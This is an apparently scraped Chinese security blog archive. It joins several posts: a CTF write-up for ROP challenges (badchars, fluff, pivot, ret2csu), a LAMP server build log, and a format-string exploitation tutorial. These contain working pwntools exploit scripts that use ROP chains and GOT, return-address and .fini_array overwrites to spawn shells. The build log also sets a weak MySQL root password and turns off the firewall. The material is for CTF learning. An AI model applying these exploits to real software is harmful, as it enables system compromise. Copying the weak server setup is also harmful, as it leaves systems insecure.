0x601090-0x10 key1 = 0x0000000000400820# mov qword ptr [r14], r15 ; ret key2 = 0x0000000000400890# pop r14 ; pop r15 ; ret key3 = 0x0000000000400893#pop rdi ; ret system = 0x000004005E0 payload = 'a' * offset + flat([key2,bss,'/bin/sh\\x00',key1,key3,bss,system]) raw_input('-&gt;') io.sendline(payload) io.interactive() badcharsida分析这个题目跟前一个write4十分的相似，但是其过滤了个别字符：会将其替换为0xEB，个人解决办法就是在bss段写好被程序处理过的字符串后，在用xor的gadgets来重新改回来，为了便于利用，32位和64位都是构造system(sh)来拿的shell。例子：传过去的是sh\\x00\\x00\\x00\\x00\\x00\\x00\\x00 到bss是这个情况，然后去找xor的gadget：其中注意这是以一个byte来进行xor的，然后这个图xor的倒数第一条语句，**其中的是dh，这个是edx的高位。r14b是r14的低位也是一个byte的字节单位。这个题目在gdb调试exp时会发现有比较便捷的办法。 exp32位：from pwn import * context.arch = 'i386' io = process('./badchars32') io.recvuntil('&gt;') elf = ELF('./badchars32') key1 = 0x08048893# mov dword ptr [edi], esi ; ret key2 = 0x08048899# pop esi ; pop edi ; ret key3 = 0x08048461# pop ebx ; ret bss = 0x804A06C-10 key4 = 0x08048897# pop ecx ; ret key5 = 0x08048890#xor byte ptr [ebx], cl ; ret sys = 0x080484E0 offset = 44 payload = 'a' * offset + flat([key2,'sh\\x00\\x00',bss,key1,key3,bss,key4,0x98,key5,sys,0xdeadbeef,bss]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' io = process('./badchars') io.recvuntil('&gt;') elf = ELF('./badchars') offset = 40 bss = 0x6010B0 key1 = 0x0000000000400b34# mov qword ptr [r13], r12 ; ret key2 = 0x0000000000400b3b# pop r12 ; pop r13 ; ret key3 = 0x0000000000400b39#pop rdi ; ret key4 = 0x0000000000400b30#xor byte ptr [r15], r14b ; ret key5 = 0x0000000000400b40#pop r14 ; pop r15 ; ret system = 0x004006F0 payload = 'a' * offset + flat([key2,'sh\\x00\\x00\\x00\\x00\\x00\\x00',bss,key1,key5,0x98,bss,key4,key3,bss,system]) raw_input('-&gt;') io.sendline(payload) io.interactive() fluff这个题目还是跟write4很相似，但是找可用的gadget是，比较难找。需要想尽办法找各种gadget，然后叠加在一起成为需要的链。这个题突破口也就在： mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret 然后再去找ecx，edx相关的gadget，里面用到了xor和xchg等相关的gadget。其中64位的找可用gadget，还需要控制一下深度： ROPgadget --binary ./fluff --depth 15 这样找出足够的gadget，以便自己试用。 exp32位：from pwn import * context.arch = 'i386' io = process('./fluff32') io.recvuntil('&gt;') elf = ELF('./fluff32') key1 = 0x080483e1# pop ebx ; ret key2 = 0x08048671# xor edx, edx ; pop esi ; mov ebp, 0xcafebabe ; ret key3 = 0x0804867b# xor edx, ebx ; pop ebp ; mov edi, 0xdeadbabe ; ret bss = 0x804A06C key4 = 0x08048689#xchg edx, ecx ; pop ebp ; mov edx, 0xdefaced0 ; ret key5 = 0x08048693# mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret sys = 0x8048430 offset = 44 payload = 'a' * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,'sh\\x00\\x00',key2,1,key3,1,key5,1,0,sys,0xdeadbeef,bss]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' io = process('./fluff') io.recvuntil('&gt;') elf = ELF('./fluff') key1 = 0x0000000000400832# pop r12 ; mov r13d, 0x604060 ; ret key2 = 0x0000000000400822#xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret key3 = 0x000000000040082f#xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret bss = 0x601090 key4 = 0x0000000000400840## : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret key5 = 0x000000000040084e# mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret key6 = 0x00000000004008c3# pop rdi ; ret sys = 0x4005E0 offset = 40 payload = 'a' * offset + flat([key1,bss,key2,1,key3,1,key4,1,key1,'/bin/sh\\x00',key2,1,key3,1,key5,1,0,key6,bss,sys]) raw_input(\"-&gt;\") io.sendline(payload) io.interactive() pivot这个题一看就是栈转移了。 ida分析可以看到会给你泄漏一个堆地址，给你去栈转移。接着看后门函数，发现这里call一个与libc连接的函数： 接着分析一下给定的so文件： void __noreturn ret2win() &#123; system(\"/bin/cat flag.txt\"); exit(0); &#125; 接着就有思路了，栈转移到给你的堆地址上，然后构造rop链： leak foothold_function_got 算出给的libc基址，回到start，再次利用漏洞 构造jmp到ret2win的链即可但是这个题目还是有技巧的，发现给你的堆地址其实跟这个libc的内存映射是很近的，并且每次差距也是固定的。那就可以直接分析so文件，来算取偏移，直接利用。 根据给的堆地址和so文件映射基址： exp132位：from pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./pivot32') elf = ELF('./pivot32') libc = ELF('./libpivot32.so') foothold_function_plt = elf.plt['foothold_function'] foothold_function_got = elf.got['foothold_function'] put_plt = elf.plt['puts'] key1 = 0x080486a8 #: leave ; ret io.recvuntil('0x') leak = int(io.recv(8),16) print('leak_stack'+ hex(leak)) io.recvuntil('now and it will land there') io.recvuntil('&gt;') payload = flat([0xdeadbeef,foothold_function_plt,put_plt,0x08048640,foothold_function_got]) raw_input('-&gt;') io.sendline(payload) io.recvuntil('stack smash') io.recvuntil('&gt;') payload = 40 * 'a' + p32(leak) +p32(key1) io.sendline(payload) io.recvuntil('foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so') leak = u32(io.recv(4)) print('leak'+ hex(leak)) ret2win = leak - libc.symbols['foothold_function'] + libc.symbols['ret2win'] io.recvuntil('now and it will land there') io.recvuntil('&gt;') io.sendline('1') io.recvuntil('send your stack smash') payload = 'a' * 44 + p32(ret2win) io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./pivot') elf = ELF('./pivot') libc = ELF('./libpivot.so') foothold_function_plt = elf.plt['foothold_function'] foothold_function_got = elf.got['foothold_function'] offset = libc.symbols['foothold_function'] - libc.symbols['ret2win'] put_plt = elf.plt['puts'] key1 = 0x0000000000400a39 #: leave ; ret key2 = 0x0000000000400b73#pop rdi ; ret key3 = 0x0000000000400b02#xchg rax, rsp ; ret key4 = 0x0000000000400b00#pop rax ; ret print('offset:' + hex(offset)) io.recvuntil('0x') leak = int(io.recv(12),16) print('leak_stack'+ hex(leak)) io.recvuntil('now and it will land there') io.recvuntil('&gt;') payload = flat([foothold_function_plt,key2,foothold_function_got,put_plt,0x004008A0]) raw_input('-&gt;') io.sendline(payload) io.recvuntil('stack smash') io.recvuntil('&gt;') payload = 40 * 'a' + p64(key4)+ p64(leak) + p64(key3) io.sendline(payload) io.recvuntil('foothold_function(), check out my .got.plt entry to gain a foothold into libpivot.so') leak = int(u64(io.recv(6).ljust(8,'\\x00'))) print('leak'+ hex(leak)) ret2win = leak - libc.symbols['foothold_function'] + libc.symbols['ret2win'] print('ret2win'+ hex(ret2win)) # raw_input('-&gt;') io.recvuntil('&gt;') payload = 'a' * 40 + p64(ret2win) io.sendline(payload) io.interactive() 这个地方因为是fgets函数来获取字符串，其遇到换行就会结束，但是在找gadgat 的时候发现leave ret的这个gadget，地址都是有0x0a,所以只能更换gadget，来伪造栈。 exp232位：from pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./pivot32') elf = ELF('./pivot32') offset = 44 io.recvuntil('0x') leak1 = int(io.recv(8),16) + 1921272 + 0x000000967 print('leak'+ hex(leak1)) raw_input('-&gt;') payload = offset * 'a' + p32(leak1) io.sendline('1') io.recvuntil('send your stack smash') io.sendline(payload) io.interactive() 64位：from pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./pivot') elf = ELF('./pivot') libc = ELF('./libpivot.so') offset = 40 io.recvuntil('0x') leak1 = int(io.recv(12),16) + 3977456 + libc.symbols['ret2win'] raw_input('-&gt;') payload = offset * 'a' + p64(leak1) io.sendline('1') io.recvuntil('send your stack smash') io.sendline(payload) io.interactive() ret2csu这个题目就是再考ret2csu（64位的万能gadget），让你控制rdx（第三个参数的寄存器）为0xdeadcafebabebeef 就可以了。但是比较难搞的一点是：在这个地方是call，所以这里应该填一个got的地址。不能是一个地址或者plt。因为call 0xaaaaa 汇编作用： push PC（也就是该汇编指令的下一个汇编指令的地址） jmp [0xaaaaa] 是该函数point指向的地址 这个题目在call完每一个函数自带的正常库函数后，都将其got表清0。但是会发现上面还有一个动态链接_DYNAMIC的信息，跟进去：发现一堆初始化用的函数。然后点进去第一个可以看看：发现这里也没有对rdx进行处理，可以使用这个。现在就是确定一下哪里存放着0x400560，毫无疑问肯定是这个_DYNAMIC里，但是自己目前还不熟悉这个结构，看起来貌似是个结构体。先gdb跟入查看吧：发现应该是0x0600E38。接下来的就简单了，传统的ret2csu。 expfrom pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./ret2csu') elf = ELF('./ret2csu') offset = 40 io.recvuntil('&gt;') key1 = 0x040089A key2 = 0x000400880 key3 = 0x0000600E38 raw_input('-&gt;') payload = offset * 'a' + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*'a',0x000004007B1]) io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"wp","slug":"wp","permalink":"http://chumen77.xyz/tags/wp/"}]},{"title":"linux- Lamp搭建记录","slug":"linux_ Lamp搭建记录","date":"2020-04-08T06:24:44.064Z","updated":"2020-04-15T14:16:28.952Z","comments":true,"path":"2020/04/08/linux_ Lamp搭建记录/","link":"","permalink":"http://chumen77.xyz/2020/04/08/linux_ Lamp搭建记录/","excerpt":"","text":"Lamp搭建记录准备工作安装编译环境：yum -y install gcc* 安装好后记得关闭防火墙和selinux 准备软件包把这些安装包都放入虚拟机自定义的路径，等待使用。 shell脚本批量解包#!/bin/bash /bin/ls *tar.gz &gt; ls.list /bin/ls *tgz &gt;&gt; ls.list for a in `cat ls.list` do /bin/tar -zxf $a done rm -rf ls.list 然后开始一一的装包，注意需要按照一定的顺序来装的。 python-develyum -y install python-devel 安装python的底层环境。 [root@localhost lamp1]# cd libxml2-2.9.1/ [root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/ [root@localhost libxml2-2.9.1]# make [root@localhost libxml2-2.9.1]# make install libmcrypt提供一些加密算法： [root@localhost lamp1]# cd libmcrypt-2.5.8/ [root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/ [root@localhost libmcrypt-2.5.8]# make [root@localhost libmcrypt-2.5.8]# make install libltdl[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/ [root@localhost libltdl]# ./configure --enable-ltdl-install [root@localhost libltdl]# make [root@localhost libltdl]# make install mhash提供加密方式的扩展 [root@localhost lamp1]# cd mhash-0.9.9.9/ [root@localhost mhash-0.9.9.9]# ./configure mcrypt提供php相关的加密支持拓展库 [root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \\./configure --with-libmcrypt-prefix=/usr/local/libmcrypt [root@localhost mcrypt-2.6.8]# make [root@localhost mcrypt-2.6.8]# make install zlib提供压缩用途的函数库 [roott@localhost lamp1]# cd zlib-1.2.3/ [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install libpng[root@localhost zlib-1.2.3]# cd ../ [root@localhost lamp1]# cd libpng-1.2.31/ [root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng [root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install 如果出现： /usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata' can not be used when making a shared object; recompile with -fPIC 解决办法 ： [root@localhost lamp1]# cd zlib-1.2.3 //进入zlib目录 [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# CFLAGS=\"-O3 -fPIC\" ./configure --prefix=/usr/local/zlib/ #使用64位元的方法进行编译 [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install [root@localhost zlib-1.2.3]# make clean 然后在重新来安装libpng即可。 jpeg6提供jpeg格式的图片 [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6 [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include [root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1 root@localhost lamp]# cd jpeg-6b/ [root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static 如果发生这样的报错： [root@localhost jpeg-6b]# make ./libtool --mode=compile gcc -O2 -I. -c ./jcapimin.c make: ./libtool：命令未找到 make: *** [jcapimin.lo] 错误 127 需要： [root@localhost jpeg-6b]# yum -y install libtool [root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess . cp：是否覆盖\"./config.guess\"？ yes [root@localhost jpeg-6b]# make clean 重新再来就好。 freetype字体库。 [root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype GD给php提供图形拓展的库 [root@localhost lamp]# mkdir /usr/local/gd2 [root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/ [root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/ 这样会爆一个错，然后需要改一下源码： [root@localhost gd-2.0.35]# vim gd_png.c 需要指定一下路径即可，这个刚刚是已经安装过的。 httped先装两个工具包： cp -r apr-1.4.6 httpd-2.4.7/srclib/apr cp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util 开始装httped：先进入装一下pcre： ./configure make make install 进入httped：先对配置进行设置： ./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=shared make make install 开服务：/usr/local/apache2/bin/apachectl start 自启动[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local 设置开机时自动启动这个服务。 mysql准备工作装两个工具： [root@localhost local]# yum -y install cmake [root@localhost local]# yum -y install bison [root@localhost local]# yum -y install ncurses-devel 建立一个用户： [root@localhost local]# useradd mysql [root@localhost local]# id mysql uid=1001(mysql) gid=1001(mysql) 组=1001(mysql) 安装ncurses： [root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite [root@localhost ncurses-5.9]# make [root@localhost ncurses-5.9]# make install 开始安装 [root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ &gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \\ &gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \\ &gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \\ &gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \\ &gt; -DMYSQL_TCP_PORT=3306 [root@localhost mysql-5.5.23]# make [root@localhost mysql-5.5.23]# make install 简单设置初始化mysql： [root@localhost mysql]# chown -R mysql:mysql . [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql 设置权限： [root@localhost mysql]# chown -R root . [root@localhost mysql]# chown -R mysql data/ 覆盖一下配置文件： [root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnf cp：是否覆盖\"/etc/my.cnf\"？ yes 接着初始化： [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 200408 03:38:45 mysqld_safe Logging to '/usr/local/mysql/data/localhost.localdomain.err'. 200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data 200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 发现卡死了： [root@localhost mysql-5.5.23]# ps aux | grep mysql [root@localhost mysql-5.5.23]# kill -9 102872 [root@localhost mysql-5.5.23]# ps aux | grep mysql mysql 103111 0.0 4.9 727288 49260 pts/3 Sl 03:39 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306 root 103201 0.0 0.0 112728 972 pts/2 S+ 03:46 0:00 grep --color=auto mysql 杀掉重新来。 [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 成功了。 自启动[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local 设置mysql密码[root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password \"123456\" [root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p 成功了。注意 history -c 清楚历史记录命令。服务都正常，字符集格式也在。 php准备工作[root@localhost mysql]# yum -y install libtool* [root@localhost local]# yum -y install libpng-devel 让php支持数据库的内容： [root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h 开始安装[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear [root@localhost php-5.4.25]# make [root@localhost php-5.4.25]# make install 配置[root@localhost php-5.4.25]# mkdir /usr/local/php/etc [root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini 复制主配置文件到/usr/local/php/etc [root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf 修改apache2配置，让其也可以支持php 重启apache2: [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stop AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl start AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message restart 可能是无效的。 验证apache与php [root@localhost htdocs]# vi index.php 写一个php探针： &lt;?php phpinfo(); ?&gt; apache与MySQL&lt;?php $link=mysql_connect('localhost','root','123456'); if($link) echo \"Congratulations!!!!!!\"; mysql_close(); ?&gt; phpadmin搭建[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin 配置文件[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php [root@localhost phpmyadmin]# vi config.inc.php 访问测试：","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"格式化字符串漏洞小总结（下）","slug":"格式化字符串漏洞小总结（下）","date":"2020-04-03T08:59:50.107Z","updated":"2020-10-06T05:34:27.572Z","comments":true,"path":"2020/04/03/格式化字符串漏洞小总结（下）/","link":"","permalink":"http://chumen77.xyz/2020/04/03/格式化字符串漏洞小总结（下）/","excerpt":"","text":"格式化字符串漏洞小总结（下）前言接着上一篇，这一篇主要记录一下对于这个漏洞的利用和ctf赛题中常见的套路和考法。 格式化字符串在栈上劫持got 每次 call libc 中的函数时都会去GOT表中查询来找出程序下一步要jmp的位址 可以通过 fmt 构造写入一个目标地址，改掉 GOT 表上的地址使得call该函数时变成jmp到我们要的目标地址去例如 ：将 printf 改成 system，原本 printf (“sh’’）就直接变成 system (“sh”),便可以拿到shell。￼这一攻击过程可以分为以下几个步骤： 确定一下printf函数的GOT表的地址，如图中是0x804a010 确定一下system函数的内存地址或者plt（通常都需要泄漏一下libc的基地址，然后加上偏移算出，当然也会遇到程序直接存在system函数，那么就是plt） 在栈上构造出printf函数GOT表的地址 利用fmt漏洞修改printf函数GOT表上的地址 然后看一个例题： inndy-echo保护和archArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析int __cdecl __noreturn main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; 可以看到会无限的打印你输入的东西，那就意味着可以无限次触发这个漏洞。并且还有system这个函数，那可以直接找其plt。 攻击思路： 在栈上放好printf函数的GOT表地址，并确定一下偏移 改这个GOT上的地址为system函数的plt 改好一会，传送一个/bin/sh，此时就会变成system(/bin/sh) 在执行的过程中需要注意一下，改GOT表上的值要单次printf多次写入，否则只改一般程序会出现无法预料的情况。还有就是需要注意一下字节对齐。 gdb调试gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (\"AAAA\\n\") 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (\"__libc_start_main\") 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (\"AAAA\\n\") gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (\"\\%6$p\") 确定偏移是7，但需要注意字节对齐，打算一会在写payload时候，就().ljust补成0x20的a，也就是offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,'a') + p32(printf_got) + p32(printf_got+2) raw_input('-&gt;') io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() 换一种就是用pwntools中针对格式化字符串漏洞利用模块中的函数fmtstr_payload，面对32位，这种情况还是很好用的： from pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,&#123;printf_got : system_plt&#125;) io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() 可以看一下其生成的payload，把目标地址信息放在开头，在64位是肯定是不可行的。（不过听说pwntools的新版本是已经支持64位了，但是本人一直没有更新成功，所以也没有测试） 劫持retaddress顾名思议，就是利用格式化串漏洞来修改函数的返回地址到我们想要jmp的地址。常见套路： jmp到带有system(/bin/sh) 的后门函数 不开nx保护，jmp到自己构造的shellcode上。 提前泄漏libc算出libc的base，jmp到onegadget地址 看一个简单的例子： 三个白帽 - pwnme-k0保护和archArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64位程序，且开启了RELRO保护，这样就无法修改got表了。 ida分析这个程序实现了一个注册用户的功能，注册好后可以来展示用户信息，修改用户信息，和退出程序。其中在展示用户信息当中，存在格式化字符串漏洞： int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) &#123; write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&amp;formata, \"Welc0me to sangebaimao!\\n\"); return printf(&amp;a9 + 4); &#125; 并且发现其中输出的buf就是你输入的密码： 还发现其中有个后门函数： 会调用system函数给你shell，那攻击思路也就是去修改程序中某个函数的返回地址，直接返回到这里就拿到shell了。 gdb调试：定位到这个存在漏洞的printf当中，确定一下：看一下此时的栈情况，输入的usename可以确定偏移是8，并且rdi也是指向了存放password的地址。 然后发现栈上也有很多栈的地址信息，当程序第二次运行到这里的时候，发现这里esp对应的地址信息也是不会变的。所以就可以通过泄漏这里的值来算出存放ret address的栈地址。 然后让程序运行到修改用户信息的函数，这下把ret address的point放到栈上，接着就可以开始修改ret address的值了。 expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./pwnme_k0') # context.clear(arch = 'amd64') io.recvuntil('lenth:20): \\n') io.sendline('%0006$lx') io.recvuntil('lenth:20): \\n') io.sendline('11111111') io.recvuntil('&gt;') io.sendline('1') # io.recvuntil('Welc0me to sangebaimao!\\n') stack = int(io.recvline_contains('7f'),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = '%2218c%8$hn' io.recvuntil('&gt;') io.sendline('2') io.recvuntil('lenth:20): \\n') io.sendline(p64(ret_add)) io.recvuntil('lenth:20): \\n') io.sendline(payload) io.recvuntil('&gt;') io.sendline('1') io.interactive() 修改FINI_ARRAY区在上面的两个例子中可以发现,之所以能成功利用格式化字符串漏洞getshell,很多时候都是因为程序中存在循环，让我们可以多次触发格式化字符串漏洞。如果程序中不存在循环呢?利用ROP劫持函数返回地址到start可以实现；当存在格式化字符串漏洞时，使用这个漏洞也做到这一点。 简单地说,一个程序在调用 main函数前会调用.init段代码和 .init_array 段的函数数组中每一个函数指针。同样的,main 函数结束后也会调用.fini段代码和 .fini_arrary 段的函数数组中的每一个函数指针。 其中FINI_ARRAY区：程序结束需要经过这里，是可以修改一下这里的析构函数。修改.fini_array区的第一个元素为start，就可以实现让程序从头再来一次，也就又可以用一次漏洞。 需要注意的是,这个区的内容在再次从start开始执行后又会被修改。 mma-ctf-2nd-2016-greeting保护和archArch: i386-32-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析int __cdecl main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+1Ch] [ebp-84h] char v5; // [esp+5Ch] [ebp-44h] unsigned int v6; // [esp+9Ch] [ebp-4h] v6 = __readgsdword(0x14u); printf(\"Please tell me your name... \"); if ( !getnline(&amp;v5, 64) ) return puts(\"Don't ignore me ;( \"); sprintf(&amp;s, \"Nice to meet you, %s :)\\n\", &amp;v5); return printf(&amp;s); &#125; 发现函数在触发格式化字符串漏洞以后就结束了，没有在调用其他的函数，也就无法利用GOT劫持或者修改ret addr。再看下getnline函数： size_t __cdecl getnline(char *s, int n) &#123; char *v3; // [esp+1Ch] [ebp-Ch] fgets(s, n, stdin); v3 = strchr(s, 10); if ( v3 ) *v3 = 0; return strlen(s); &#125; 发现有了strlen的函数，并且其参数也是可以控制的。这就有了攻击思路，在触发格式化字符串的漏洞时： 修改.fini_array区的一个函数指针地址为start，让其重启跑一次程序 因为知道肯定会跑到strlen那里，所以在劫持strlen的GOT为system 待程序重新跑起来，就在传送一个/bin/sh即可 注意的是,这个.fini_array区的内容在再次从start开始执行后又会被修改,且程序可读取的字节数有限,因此需要同时修改两个地址，也就是单次printf多次写入，这个题并且需要合理调整payload。 gdb调试这个题目因为前面有 sprintf(&amp;s, \"Nice to meet you, %s :)\\n\", &amp;v5); 所以其栈上会放上Nice to meet you,的字符串，此时需要注意对齐。对齐后发现偏移为12，在写payload的时候可以使用单次printf多次写入的脚本，所以来().ljust(0x32,&#39;a&#39;) ,所以偏移需要加上(0x32 - 2)/4 = 24 expfrom pwn import * context.arch = 'i386' context.log_level = 'debug' io = process('./greeting') # io = remote('111.198.29.45',42729) elf = ELF('./greeting') strlen_got = 0x08049A54 fini_array = 0x08049934 start = 0x080484F0 system_plt = 0x08048490 offset = 12 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result key1 = 0x08048490 prev = 18 #注意这个题在可控格式化字符串前有字符输出 payload = \"\" for i in range(2): payload +=fmt_short(prev,(key1 &gt;&gt; 16*i) &amp; 0xffff,24+i) prev = (key1 &gt;&gt; i*16) &amp; 0xffff key2 = 0x84F0 for i in range(1): payload +=fmt_short(prev,(key2 &gt;&gt; 16*i) &amp; 0xffff,26+i) prev = (key2 &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x32,'a') payload += p32(strlen_got) + p32(strlen_got+2) +p32(fini_array) io.recvuntil('name...') raw_input('-&gt;') io.sendline(payload) io.recvuntil('name...') io.sendline('/bin/sh\\x00') io.interactive() 小tips绕过canary可以利用fmt漏洞，任意读的特性，在有canary的程序中，算好偏移以后读出canary存的检验值（基本都是以00结尾比较好找），然后在buffer overflow 时，在对应位置填上canary检验值，即可绕过canary。 